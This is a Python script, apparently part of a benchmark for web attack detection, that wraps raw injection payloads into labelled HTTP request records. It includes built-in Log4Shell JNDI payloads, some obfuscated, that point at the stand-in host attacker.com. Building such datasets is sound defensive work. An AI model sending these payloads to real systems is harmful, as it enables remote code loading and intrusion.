#!/usr/bin/env python3
"""
generator.py
------------
Converts raw payload lists (one payload per line) into
structured HTTP request records usable by the benchmark.

Usage:
  python scripts/generator.py --input datasets/raw/sqli_generic.txt \
                               --attack-type "SQL Injection"         \
                               --output datasets/processed/sqli.json
"""

import json
import random
import argparse
from pathlib import Path
from typing import Callable


# ---------------------------------------------------------------------------
# Injection point templates
# Each template is a function: payload → (method, url, headers, body)
# ---------------------------------------------------------------------------

def _json_body(endpoint: str, key: str, payload: str) -> tuple:
    return ("POST", endpoint, {"Content-Type": "application/json"},
            json.dumps({key: payload}))


TEMPLATES_BY_ATTACK: dict[str, list[Callable]] = {

    "SQL Injection": [
        lambda p: ("GET",  f"/api/users?id={p}",                {},    ""),
        lambda p: ("GET",  f"/api/products?search={p}",         {},    ""),
        lambda p: ("GET",  f"/api/orders?filter={p}&page=1",    {},    ""),
        lambda p: _json_body("/api/auth/login",   "username", p),
        lambda p: _json_body("/api/auth/login",   "password", p),
        lambda p: _json_body("/api/search",       "query",    p),
        lambda p: ("GET",  f"/api/items?sort={p}",              {},    ""),
    ],

    "XSS": [
        lambda p: ("GET",  f"/api/search?q={p}",                {},    ""),
        lambda p: _json_body("/api/feedback",   "message",  p),
        lambda p: _json_body("/api/profile",    "bio",       p),
        lambda p: ("GET",  f"/api/comments?text={p}",           {},    ""),
        lambda p: _json_body("/api/posts",      "content",   p),
    ],

    "Path Traversal": [
        lambda p: ("GET",  f"/api/files?path={p}",              {},    ""),
        lambda p: ("GET",  f"/api/download?file={p}",           {},    ""),
        lambda p: _json_body("/api/render",     "template",  p),
        lambda p: ("GET",  f"/api/assets?name={p}",             {},    ""),
    ],

    "Command Injection": [
        lambda p: ("GET",  f"/api/ping?host={p}",               {},    ""),
        lambda p: _json_body("/api/exec",       "command",   p),
        lambda p: ("GET",  f"/api/dns?domain={p}",              {},    ""),
        lambda p: _json_body("/api/tools/run",  "args",      p),
    ],

    "Log4Shell": [
        lambda p: ("GET",  f"/api/users?id={p}",                {"X-Api-Version": p}, ""),
        lambda p: ("GET",  "/api/users",                         {"User-Agent": p},    ""),
        lambda p: ("POST", "/api/auth/login",                    {"X-Forwarded-For": p}, ""),
    ],

    "Generic": [
        lambda p: ("GET",  f"/api/endpoint?param={p}",          {},    ""),
        lambda p: _json_body("/api/data",       "value",     p),
    ],
}

ATTACKER_UAS = [
    "sqlmap/1.7.8#stable",
    "curl/7.68.0",
    "python-requests/2.28.2",
    "Nikto/2.1.6",
    "OWASP ZAP/2.12.0",
    "Burp Suite/2023.1",
    "masscan/1.3.2",
]

ATTACKER_IPS = [f"10.{random.randint(0,9)}.{random.randint(0,9)}.{i}"
                for i in range(1, 100)]


def load_payloads(path: Path, skip_comments: bool = True) -> list[str]:
    """Load payloads from a text file (one per line)."""
    lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()
    payloads = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if skip_comments and line.startswith("#"):
            continue
        payloads.append(line)
    return payloads


def payloads_to_records(
        payloads: list[str],
        attack_type: str = "Generic",
        source: str = "generator",
        deduplicate: bool = True,
) -> list[dict]:
    """
    Convert a list of raw payloads into structured request records.
    For each payload, one random template is applied.
    """
    if deduplicate:
        payloads = list(dict.fromkeys(payloads))  # preserve order, remove dups

    templates = TEMPLATES_BY_ATTACK.get(attack_type, TEMPLATES_BY_ATTACK["Generic"])
    records = []

    for payload in payloads:
        template = random.choice(templates)
        method, url, headers, body = template(payload)

        # Add realistic attacker headers
        headers = {
            "User-Agent":   random.choice(ATTACKER_UAS),
            "Accept":       "*/*",
            **headers,
        }

        records.append({
            "method":      method,
            "url":         url,
            "headers":     headers,
            "body":        body,
            "ip":          random.choice(ATTACKER_IPS),
            "label":       "attack",
            "attack_type": attack_type,
            "raw_payload": payload,
            "source":      source,
        })

    return records


def generate_dataset(
        input_path: Path,
        attack_type: str,
        output_path: Path,
        limit: int | None = None,
) -> list[dict]:
    """Full pipeline: payload file → structured JSON dataset."""
    print(f"  Loading payloads from {input_path.name}...")
    payloads = load_payloads(input_path)

    if limit:
        payloads = payloads[:limit]

    print(f"  Generating {len(payloads)} records (attack_type={attack_type})...")
    records = payloads_to_records(payloads, attack_type=attack_type,
                                  source=input_path.stem)

    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(json.dumps(records, indent=2, ensure_ascii=False))
    print(f"  Saved → {output_path}")
    return records


# ---------------------------------------------------------------------------
# Log4Shell payload set (built-in because it's niche)
# ---------------------------------------------------------------------------
LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://attacker.com/a}",
    "${jndi:ldaps://attacker.com/a}",
    "${jndi:rmi://attacker.com/a}",
    "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
    "${j${::-n}di:ldap://attacker.com/a}",
    "${j${lower:n}di:ldap://attacker.com/a}",
]


def generate_log4shell_dataset(output_path: Path) -> list[dict]:
    records = payloads_to_records(LOG4SHELL_PAYLOADS,
                                  attack_type="Log4Shell",
                                  source="built-in-log4shell")
    output_path.write_text(json.dumps(records, indent=2))
    print(f"  Saved Log4Shell ({len(records)} records) → {output_path}")
    return records


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Payload → HTTP request generator")
    parser.add_argument("--input",       required=True, help="Raw payload .txt file")
    parser.add_argument("--attack-type", default="Generic",
                        choices=list(TEMPLATES_BY_ATTACK.keys()),
                        help="Attack category")
    parser.add_argument("--output",      required=True, help="Output .json file")
    parser.add_argument("--limit",       type=int, default=None,
                        help="Max payloads to process")
    args = parser.parse_args()

    generate_dataset(
        input_path=Path(args.input),
        attack_type=args.attack_type,
        output_path=Path(args.output),
        limit=args.limit,
    )
